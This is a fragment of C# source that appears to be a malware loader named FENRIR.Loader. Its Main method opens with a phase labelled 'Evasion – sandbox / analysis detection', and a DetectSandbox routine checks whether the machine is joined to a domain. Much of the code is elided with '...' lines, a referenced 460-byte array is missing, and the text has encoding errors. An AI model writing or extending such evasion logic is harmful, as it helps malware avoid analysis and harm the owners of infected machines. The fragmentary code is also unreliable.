...
namespace FENRIR.Loader
{
    internal static class Program
    {
        ...
        // 460 bytes â€“ full array included
        // ========================================================================
        ...
        static void Main()
        {
            // Phase 1: Evasion â€“ sandbox / analysis detection
            if (DetectSandbox())
            {
        ...
        private static bool DetectSandbox()
        {
            ...
            try
            {
                if (System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain() != null)
                    return true; // Domain-joined â€“ unexpected in our sandbox
            }
            catch
            {
                // Not domain-joined â€“ good
            }
            ...
            return false; // All checks passed â€“ proceed
        }
